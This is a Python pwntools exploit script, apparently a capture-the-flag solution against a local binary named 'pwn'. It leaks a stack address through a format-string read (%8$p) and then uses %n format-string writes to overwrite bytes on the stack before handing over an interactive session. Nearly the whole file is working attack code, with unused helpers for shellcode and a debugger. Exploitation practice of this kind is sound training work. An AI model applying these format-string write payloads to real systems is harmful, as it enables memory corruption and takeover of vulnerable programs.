from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
libc=ELF('/home/cc/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6')
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		gdb.attach(p,x)
		pause()
p=process("./pwn")
elf=ELF("./pwn")
def choose(choice):
    sla(b">> ",choice)
def update():
    payload=b'%7$lln'.ljust(8,b'\x00')+p64(0x18+stack_addr)
    sla(b">> ",payload)
def work(shellcode):
    start=0
    for i in shellcode:
        choose(b'%'+str(i).encode()+b'c%7$n'.ljust(8,b'\x00')+p64(0x2a+stack_addr))
print("send %8$p")
choose(b'%8$p')
ru(b'your input is:')
stack_addr=int(rc(14),16)-0x20
print("stack_addr: ",hex(stack_addr))


choose(b'%63c%7$n'.ljust(8,b'\x00')+p64(0x28+stack_addr))
choose(b'%26c%7$n'.ljust(8,b'\x00')+p64(0x29+stack_addr))
choose(b'%64c%7$n'.ljust(8,b'\x00')+p64(0x2a+stack_addr))
# gdba('b *0x0000000000401305')
for i in range(25):
    choose(b'win')
p.interactive()